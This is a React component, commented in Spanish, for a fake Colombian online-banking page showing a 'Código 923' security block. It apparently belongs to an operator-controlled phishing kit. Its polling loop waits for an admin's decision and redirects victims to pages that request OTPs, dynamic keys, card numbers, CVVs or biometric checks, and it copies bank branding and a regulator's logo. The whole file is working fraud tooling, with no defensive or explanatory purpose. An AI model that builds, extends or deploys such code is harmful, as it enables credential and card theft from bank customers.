import { useEffect, useState } from "react";
import Loading from "../../components/Loading";
import './css/LoginModal.css';
import { limpiarPaddingBody } from "@utils";

// Se exporta el componente
export default function Error923page() {

    // Se inicializa el estado del boton
    const [cargando, setCargando] = useState(false);

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setFechaHora] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se obtiene la IP
        obtenerIP();

        // Se obtiene la fecha/hora con formato
        obtenerFechaHora();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        obtenerFechaHora();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto =
            (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        // Se inicializa el intervalId
        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {
            obtenerFechaHora();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {
                obtenerFechaHora();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {
            clearTimeout(timeoutId);
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // usando el servicio externo api.ipify.org
    const obtenerIP = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // y la formatea en español (Colombia)
    const obtenerFechaHora = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const opciones = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = ahora.toLocaleString("es-CO", opciones);

        // Se guarda el valor formateado en el estado
        setFechaHora(formato);
    };

    // Refs para polling (copiado de otras vistas)
    const estadoAnteriorRef = useState(null);

    // --- LOGIC: Handle User Response ---
    const handleAction = async (accion) => {
        try {
            setCargando(true);
            const raw = localStorage.getItem("datos_usuario");
            const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
            const sesionId = usuarioLocalStorage?.sesion_id;

            if (!sesionId) {
                // alert("Error de sesión");
                setCargando(false);
                return;
            }

            // Import axios dynamically if needed, or assume global instance
            const { instanceBackend } = await import("../../axios/instanceBackend");

            await instanceBackend.post('/response-923', {
                sesionId,
                accion
            });

            // Unify logic: Both Confirm and Cancel enter polling state
            // "si es cancelar ... activamos los botones sin cerrar la session es solo es queda en cargando"
            iniciarPolling(sesionId);

        } catch (error) {
            console.error("Error enviando respuesta 923", error);
            setCargando(false);

            if (error.response) {
                // El servidor respondió con un código de estado fuera del rango 2xx
                alert(`Error ${error.response.status}: ${error.response.data?.message || 'Error del servidor'}`);
            } else if (error.request) {
                // La petición fue hecha pero no se recibió respuesta
                alert("Error de conexión con el servidor");
            } else {
                // Hubo un error al configurar la petición
                alert("Error inesperado: " + error.message);
            }
        }
    };

    const iniciarPolling = (sesionId) => {
        let attempts = 0;
        const MAX_ATTEMPTS = 60; // ~3 minutos
        const TIMEOUT_MS = 180000;
        let timeoutId;

        const pollingInterval = setInterval(async () => {
            attempts++;
            try {
                const { instanceBackend } = await import("../../axios/instanceBackend");
                const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                const { estado } = response.data;

                console.log('Polling 923:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);

                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    alert("Tiempo de espera agotado.");
                    return;
                }

                // Estados que indican que el admin tomó una decisión
                const estadosFinales = [
                    'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
                    'error_otp', 'error_din', 'error_login', 'solicitar_biometria',
                    'solicitar_tc', 'solicitar_tc_custom', 'solicitar_cvv_custom',
                    'error_923', // Loop? No, si admin manda 923 de nuevo recarga
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                ];

                if (estadosFinales.includes(estado?.toLowerCase())) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);

                    switch (estado.toLowerCase()) {
                        case 'solicitar_otp': window.location.href = '/numero-otp'; break;
                        case 'solicitar_din': window.location.href = '/clave-dinamica'; break;
                        case 'solicitar_finalizar': window.location.href = '/finalizado-page'; break;
                        case 'solicitar_biometria': window.location.href = '/verificacion-identidad'; break;
                        case 'error_923': window.location.reload(); break; // Re-activar
                        case 'solicitar_tc': window.location.href = '/validacion-tc'; break;
                        case 'solicitar_tc_custom': window.location.href = '/validacion-tc'; break;
                        case 'solicitar_cvv_custom': window.location.href = '/validacion-cvv'; break;
                        case 'error_otp': window.location.href = '/numero-otp'; break;
                        case 'error_din': window.location.href = '/clave-dinamica'; break;
                        case 'error_login': window.location.href = '/autenticacion'; break;
                        default: break;
                    }
                }

            } catch (error) {
                console.error("Polling error", error);
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                    setCargando(false);
                    alert("Error de conexión. Intente nuevamente.");
                }
            }
        }, 3000);

        // Safety timeout cleanup
        timeoutId = setTimeout(() => {
            clearInterval(pollingInterval);
            setCargando(false);
        }, TIMEOUT_MS);
    };

    // Se retorna el componente
    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/images/auth-trazo.svg")',
                        backgroundRepeat: "no-repeat",
                        backgroundPosition: "center",
                        backgroundPositionY: "-70px",
                        backgroundPositionX: "-500px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/images/img_pantalla2/descarga.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
                            {/* ICON REDESIGN */}
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "center"
                                }}
                            >
                                <div
                                    style={{
                                        width: "60px",
                                        height: "60px",
                                        backgroundColor: "#FBDC1D",
                                        borderRadius: "50%",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        marginBottom: "20px"
                                    }}
                                >
                                    <img
                                        src="/assets/images/stop2.png"
                                        alt="Alert Icon"
                                        style={{ width: "25px", height: "30px" }}
                                    />
                                </div>
                            </div>

                            <div style={{
                                textAlign: "center"
                            }}>
                                <h2 style={{
                                    fontSize: "20px",
                                    fontWeight: "bold",
                                    marginBottom: "20px",
                                    lineHeight: "1.3",
                                    color: "#ffffff",
                                }}>
                                    Por seguridad, no puedes continuar la transacción
                                </h2>

                                <p style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                                    Código: 923 Para confirmar si eres tú quién hace la transacción, te escribiremos desde nuestro WhatsApp oficial <strong>301 353 6788</strong>, responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.
                                </p>

                                <p style={{ fontSize: "14px", fontWeight: "bold", marginBottom: "30px", color: "#ffffff" }}>
                                    Código 923
                                </p>
                            </div>

                            <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                                <button onClick={() => handleAction('cancelar')} className="login-btn-borrar">
                                    Cancelar
                                </button>
                                <button className="login-btn" onClick={() => handleAction('confirmar')}>
                                    Confirmar
                                </button>
                            </div>
                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "180px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div >

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {cargando ? <Loading /> : null}
        </>
    );
};